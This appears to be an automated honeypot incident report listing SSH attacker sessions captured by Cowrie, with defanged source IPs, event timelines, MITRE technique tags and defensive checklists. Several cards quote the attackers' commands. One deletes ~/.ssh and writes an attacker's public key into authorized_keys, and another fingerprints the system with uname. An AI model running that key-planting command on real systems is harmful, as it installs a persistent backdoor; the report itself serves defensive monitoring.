### 🔴 HIGH · IR-b8d599cd0abd

| Field | Detail |
|---|---|
| **Source IP** | `123.25.115[.]112` |
| **First Seen** | 2026-07-09 16:58 |
| **Last Seen** | 2026-07-09 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 16:58:11` | `cowrie.session.connect` |
| `2026-07-09 16:58:11` | `cowrie.client.version` |
| `2026-07-09 16:58:11` | `cowrie.client.kex` |
| `2026-07-09 16:58:12` | `cowrie.login.success` |
| `2026-07-09 16:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.25.115[.]112` to AbuseIPDB if not already reported
- [ ] Block `123.25.115[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac18fd29aa8e

| Field | Detail |
|---|---|
| **Source IP** | `123.25.115[.]112` |
| **First Seen** | 2026-07-09 16:58 |
| **Last Seen** | 2026-07-09 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 16:58:12` | `cowrie.session.connect` |
| `2026-07-09 16:58:12` | `cowrie.client.version` |
| `2026-07-09 16:58:13` | `cowrie.client.kex` |
| `2026-07-09 16:58:14` | `cowrie.login.success` |
| `2026-07-09 16:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.25.115[.]112` to AbuseIPDB if not already reported
- [ ] Block `123.25.115[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0496a2505fd

| Field | Detail |
|---|---|
| **Source IP** | `199.195.254[.]215` |
| **First Seen** | 2026-07-09 17:00 |
| **Last Seen** | 2026-07-09 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:00:52` | `cowrie.session.connect` |
| `2026-07-09 17:00:52` | `cowrie.client.version` |
| `2026-07-09 17:00:52` | `cowrie.client.kex` |
| `2026-07-09 17:00:52` | `cowrie.login.success` |
| `2026-07-09 17:00:52` | `cowrie.session.params` |
| `2026-07-09 17:00:52` | `cowrie.command.input` |
| `2026-07-09 17:00:52` | `cowrie.command.failed` |
| `2026-07-09 17:00:52` | `cowrie.log.closed` |
| `2026-07-09 17:00:53` | `cowrie.session.params` |
| `2026-07-09 17:00:53` | `cowrie.command.input` |
| `2026-07-09 17:00:53` | `cowrie.session.file_download` |
| `2026-07-09 17:00:53` | `cowrie.log.closed` |
| `2026-07-09 17:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `199.195.254[.]215` to AbuseIPDB if not already reported
- [ ] Block `199.195.254[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ffcd6182590

| Field | Detail |
|---|---|
| **Source IP** | `199.195.254[.]215` |
| **First Seen** | 2026-07-09 17:00 |
| **Last Seen** | 2026-07-09 17:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:00:53` | `cowrie.session.connect` |
| `2026-07-09 17:00:53` | `cowrie.client.version` |
| `2026-07-09 17:00:53` | `cowrie.client.kex` |
| `2026-07-09 17:00:53` | `cowrie.login.success` |
| `2026-07-09 17:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `199.195.254[.]215` to AbuseIPDB if not already reported
- [ ] Block `199.195.254[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ca7fd3a0567

| Field | Detail |
|---|---|
| **Source IP** | `199.195.254[.]215` |
| **First Seen** | 2026-07-09 17:00 |
| **Last Seen** | 2026-07-09 17:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:00:53` | `cowrie.session.connect` |
| `2026-07-09 17:00:53` | `cowrie.client.version` |
| `2026-07-09 17:00:53` | `cowrie.client.kex` |
| `2026-07-09 17:00:53` | `cowrie.login.success` |
| `2026-07-09 17:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `199.195.254[.]215` to AbuseIPDB if not already reported
- [ ] Block `199.195.254[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57513e29fb0c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-09 17:02 |
| **Last Seen** | 2026-07-09 17:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:02:41` | `cowrie.session.connect` |
| `2026-07-09 17:02:41` | `cowrie.client.version` |
| `2026-07-09 17:02:41` | `cowrie.client.kex` |
| `2026-07-09 17:02:43` | `cowrie.login.success` |
| `2026-07-09 17:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed0443d64dc9

| Field | Detail |
|---|---|
| **Source IP** | `31.76.78[.]140` |
| **First Seen** | 2026-07-09 17:02 |
| **Last Seen** | 2026-07-09 17:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:02:42` | `cowrie.session.connect` |
| `2026-07-09 17:02:42` | `cowrie.client.version` |
| `2026-07-09 17:02:42` | `cowrie.client.kex` |
| `2026-07-09 17:02:43` | `cowrie.login.success` |
| `2026-07-09 17:02:44` | `cowrie.session.params` |
| `2026-07-09 17:02:44` | `cowrie.command.input` |
| `2026-07-09 17:02:44` | `cowrie.command.failed` |
| `2026-07-09 17:02:44` | `cowrie.log.closed` |
| `2026-07-09 17:02:45` | `cowrie.session.params` |
| `2026-07-09 17:02:45` | `cowrie.command.input` |
| `2026-07-09 17:02:45` | `cowrie.session.file_download` |
| `2026-07-09 17:02:45` | `cowrie.log.closed` |
| `2026-07-09 17:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.76.78[.]140` to AbuseIPDB if not already reported
- [ ] Block `31.76.78[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8137c24b865

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-09 17:02 |
| **Last Seen** | 2026-07-09 17:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:02:43` | `cowrie.session.connect` |
| `2026-07-09 17:02:43` | `cowrie.client.version` |
| `2026-07-09 17:02:44` | `cowrie.client.kex` |
| `2026-07-09 17:02:45` | `cowrie.login.success` |
| `2026-07-09 17:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96521805ee04

| Field | Detail |
|---|---|
| **Source IP** | `31.76.78[.]140` |
| **First Seen** | 2026-07-09 17:02 |
| **Last Seen** | 2026-07-09 17:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:02:45` | `cowrie.session.connect` |
| `2026-07-09 17:02:45` | `cowrie.client.version` |
| `2026-07-09 17:02:45` | `cowrie.client.kex` |
| `2026-07-09 17:02:45` | `cowrie.login.success` |
| `2026-07-09 17:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.76.78[.]140` to AbuseIPDB if not already reported
- [ ] Block `31.76.78[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c160874f8b0e

| Field | Detail |
|---|---|
| **Source IP** | `31.76.78[.]140` |
| **First Seen** | 2026-07-09 17:02 |
| **Last Seen** | 2026-07-09 17:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:02:45` | `cowrie.session.connect` |
| `2026-07-09 17:02:45` | `cowrie.client.version` |
| `2026-07-09 17:02:45` | `cowrie.client.kex` |
| `2026-07-09 17:02:46` | `cowrie.login.success` |
| `2026-07-09 17:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.76.78[.]140` to AbuseIPDB if not already reported
- [ ] Block `31.76.78[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af1765396c9b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:05 |
| **Last Seen** | 2026-07-09 17:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:05:51` | `cowrie.session.connect` |
| `2026-07-09 17:05:51` | `cowrie.client.version` |
| `2026-07-09 17:05:51` | `cowrie.client.kex` |
| `2026-07-09 17:05:54` | `cowrie.login.success` |
| `2026-07-09 17:05:55` | `cowrie.session.params` |
| `2026-07-09 17:05:55` | `cowrie.command.input` |
| `2026-07-09 17:05:55` | `cowrie.command.input` |
| `2026-07-09 17:05:55` | `cowrie.command.input` |
| `2026-07-09 17:05:55` | `cowrie.command.input` |
| `2026-07-09 17:05:55` | `cowrie.command.input` |
| `2026-07-09 17:05:55` | `cowrie.command.success` |
| `2026-07-09 17:05:55` | `cowrie.command.input` |
| `2026-07-09 17:05:55` | `cowrie.command.input` |
| `2026-07-09 17:05:55` | `cowrie.command.input` |
| `2026-07-09 17:05:55` | `cowrie.command.input` |
| `2026-07-09 17:05:56` | `cowrie.log.closed` |
| `2026-07-09 17:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e2039734e8f

| Field | Detail |
|---|---|
| **Source IP** | `159.65.128[.]12` |
| **First Seen** | 2026-07-09 17:06 |
| **Last Seen** | 2026-07-09 17:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:06:59` | `cowrie.session.connect` |
| `2026-07-09 17:06:59` | `cowrie.client.version` |
| `2026-07-09 17:06:59` | `cowrie.client.kex` |
| `2026-07-09 17:07:00` | `cowrie.login.success` |
| `2026-07-09 17:07:01` | `cowrie.session.params` |
| `2026-07-09 17:07:01` | `cowrie.command.input` |
| `2026-07-09 17:07:01` | `cowrie.command.failed` |
| `2026-07-09 17:07:02` | `cowrie.log.closed` |
| `2026-07-09 17:07:03` | `cowrie.session.params` |
| `2026-07-09 17:07:03` | `cowrie.command.input` |
| `2026-07-09 17:07:03` | `cowrie.session.file_download` |
| `2026-07-09 17:07:03` | `cowrie.log.closed` |
| `2026-07-09 17:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.128[.]12` to AbuseIPDB if not already reported
- [ ] Block `159.65.128[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7f8fdf8dea

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 17:07 |
| **Last Seen** | 2026-07-09 17:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:07:02` | `cowrie.session.connect` |
| `2026-07-09 17:07:04` | `cowrie.client.version` |
| `2026-07-09 17:07:04` | `cowrie.client.kex` |
| `2026-07-09 17:07:09` | `cowrie.login.success` |
| `2026-07-09 17:07:12` | `cowrie.session.params` |
| `2026-07-09 17:07:12` | `cowrie.command.input` |
| `2026-07-09 17:07:13` | `cowrie.log.closed` |
| `2026-07-09 17:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c6a852bedad

| Field | Detail |
|---|---|
| **Source IP** | `159.65.128[.]12` |
| **First Seen** | 2026-07-09 17:07 |
| **Last Seen** | 2026-07-09 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:07:03` | `cowrie.session.connect` |
| `2026-07-09 17:07:03` | `cowrie.client.version` |
| `2026-07-09 17:07:03` | `cowrie.client.kex` |
| `2026-07-09 17:07:04` | `cowrie.login.success` |
| `2026-07-09 17:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.128[.]12` to AbuseIPDB if not already reported
- [ ] Block `159.65.128[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f026b22bd87

| Field | Detail |
|---|---|
| **Source IP** | `159.65.128[.]12` |
| **First Seen** | 2026-07-09 17:07 |
| **Last Seen** | 2026-07-09 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:07:05` | `cowrie.session.connect` |
| `2026-07-09 17:07:05` | `cowrie.client.version` |
| `2026-07-09 17:07:05` | `cowrie.client.kex` |
| `2026-07-09 17:07:06` | `cowrie.login.success` |
| `2026-07-09 17:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.128[.]12` to AbuseIPDB if not already reported
- [ ] Block `159.65.128[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b69070a278e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:07 |
| **Last Seen** | 2026-07-09 17:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:07:47` | `cowrie.session.connect` |
| `2026-07-09 17:07:48` | `cowrie.client.version` |
| `2026-07-09 17:07:48` | `cowrie.client.kex` |
| `2026-07-09 17:07:50` | `cowrie.login.success` |
| `2026-07-09 17:07:52` | `cowrie.session.params` |
| `2026-07-09 17:07:52` | `cowrie.command.input` |
| `2026-07-09 17:07:52` | `cowrie.command.input` |
| `2026-07-09 17:07:52` | `cowrie.command.input` |
| `2026-07-09 17:07:52` | `cowrie.command.input` |
| `2026-07-09 17:07:52` | `cowrie.command.input` |
| `2026-07-09 17:07:52` | `cowrie.command.success` |
| `2026-07-09 17:07:52` | `cowrie.command.input` |
| `2026-07-09 17:07:52` | `cowrie.command.input` |
| `2026-07-09 17:07:52` | `cowrie.command.input` |
| `2026-07-09 17:07:52` | `cowrie.command.input` |
| `2026-07-09 17:07:52` | `cowrie.log.closed` |
| `2026-07-09 17:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f04a0b8470c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:09 |
| **Last Seen** | 2026-07-09 17:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:09:36` | `cowrie.session.connect` |
| `2026-07-09 17:09:36` | `cowrie.client.version` |
| `2026-07-09 17:09:36` | `cowrie.client.kex` |
| `2026-07-09 17:09:38` | `cowrie.login.success` |
| `2026-07-09 17:09:40` | `cowrie.session.params` |
| `2026-07-09 17:09:40` | `cowrie.command.input` |
| `2026-07-09 17:09:40` | `cowrie.command.input` |
| `2026-07-09 17:09:40` | `cowrie.command.input` |
| `2026-07-09 17:09:40` | `cowrie.command.input` |
| `2026-07-09 17:09:40` | `cowrie.command.input` |
| `2026-07-09 17:09:40` | `cowrie.command.success` |
| `2026-07-09 17:09:40` | `cowrie.command.input` |
| `2026-07-09 17:09:40` | `cowrie.command.input` |
| `2026-07-09 17:09:40` | `cowrie.command.input` |
| `2026-07-09 17:09:40` | `cowrie.command.input` |
| `2026-07-09 17:09:41` | `cowrie.log.closed` |
| `2026-07-09 17:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdca911e76be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:11 |
| **Last Seen** | 2026-07-09 17:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:11:19` | `cowrie.session.connect` |
| `2026-07-09 17:11:20` | `cowrie.client.version` |
| `2026-07-09 17:11:20` | `cowrie.client.kex` |
| `2026-07-09 17:11:22` | `cowrie.login.success` |
| `2026-07-09 17:11:24` | `cowrie.session.params` |
| `2026-07-09 17:11:24` | `cowrie.command.input` |
| `2026-07-09 17:11:24` | `cowrie.command.input` |
| `2026-07-09 17:11:24` | `cowrie.command.input` |
| `2026-07-09 17:11:24` | `cowrie.command.input` |
| `2026-07-09 17:11:24` | `cowrie.command.input` |
| `2026-07-09 17:11:24` | `cowrie.command.success` |
| `2026-07-09 17:11:24` | `cowrie.command.input` |
| `2026-07-09 17:11:24` | `cowrie.command.input` |
| `2026-07-09 17:11:24` | `cowrie.command.input` |
| `2026-07-09 17:11:24` | `cowrie.command.input` |
| `2026-07-09 17:11:24` | `cowrie.log.closed` |
| `2026-07-09 17:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82847b5161a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:13 |
| **Last Seen** | 2026-07-09 17:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:13:01` | `cowrie.session.connect` |
| `2026-07-09 17:13:01` | `cowrie.client.version` |
| `2026-07-09 17:13:01` | `cowrie.client.kex` |
| `2026-07-09 17:13:03` | `cowrie.login.success` |
| `2026-07-09 17:13:05` | `cowrie.session.params` |
| `2026-07-09 17:13:05` | `cowrie.command.input` |
| `2026-07-09 17:13:05` | `cowrie.command.input` |
| `2026-07-09 17:13:05` | `cowrie.command.input` |
| `2026-07-09 17:13:05` | `cowrie.command.input` |
| `2026-07-09 17:13:05` | `cowrie.command.input` |
| `2026-07-09 17:13:05` | `cowrie.command.success` |
| `2026-07-09 17:13:05` | `cowrie.command.input` |
| `2026-07-09 17:13:05` | `cowrie.command.input` |
| `2026-07-09 17:13:05` | `cowrie.command.input` |
| `2026-07-09 17:13:05` | `cowrie.command.input` |
